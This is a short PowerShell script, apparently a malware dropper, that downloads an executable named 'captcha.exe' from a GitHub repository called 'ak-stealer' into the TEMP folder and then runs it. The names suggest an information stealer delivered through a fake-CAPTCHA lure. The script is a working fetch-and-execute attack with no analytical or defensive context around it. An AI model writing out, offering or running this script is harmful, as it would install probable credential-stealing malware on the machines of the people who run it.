$dropperUrl = "https://raw.githubusercontent.com/ak-stealer/lmao/refs/heads/main/captcha.exe"
$tempPath = "$env:TEMP\captcha.exe"
Invoke-WebRequest -Uri $dropperUrl -OutFile $tempPath
Start-Process -FilePath $tempPath
